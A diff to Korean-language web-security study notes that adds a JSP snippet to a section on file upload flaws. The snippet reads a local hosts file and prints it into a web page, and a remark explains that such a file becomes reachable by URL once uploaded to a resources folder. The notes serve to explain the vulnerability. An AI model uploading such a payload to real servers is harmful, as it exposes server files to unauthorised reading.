@@ -35,3 +35,17 @@
 
 ## 파일 업로드 다운로드
 > 파일 업로드 다운로드 기능이 적절히 제어되지 않으면 악성코드나 쉘프로그램이 서버에 업로드되어 실행될 수 있다.
+```
+<body>
+<%
+    File file = new File("C:/Program Files/Git/etc/hosts");
+    BufferedReader br = new BufferedReader(new FileReader(file));
+    String str =br.readLine();
+    while(str != null){
+        out.println(str + "<br/>");
+        str = br.readLine();
+    }
+%>
+</body>
+요런식의 파일을 리소스 파일에 업로드시 url로 직접 접근 가능함...
+```
